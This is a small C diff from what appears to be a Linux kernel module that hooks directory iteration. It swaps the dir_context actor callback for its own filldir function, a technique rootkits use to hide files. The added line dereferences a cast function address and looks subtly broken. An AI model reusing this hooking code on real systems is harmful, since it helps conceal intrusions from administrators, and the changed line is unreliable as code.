@@ -98,7 +98,7 @@ static int fs_filldir_new(void *buf, const char *name, int namelen,
 static int fs_iterate_new(struct file *filp, struct dir_context *ctx)
 {
     fs_filldir_orig = ctx->actor;
-    *((filldir_t *)&ctx->actor) = &fs_filldir_new;
+    *((filldir_t *)&ctx->actor) = *((filldir_t *)&fs_filldir_new);
 
     return fs_iterate_orig(filp, ctx);
 }
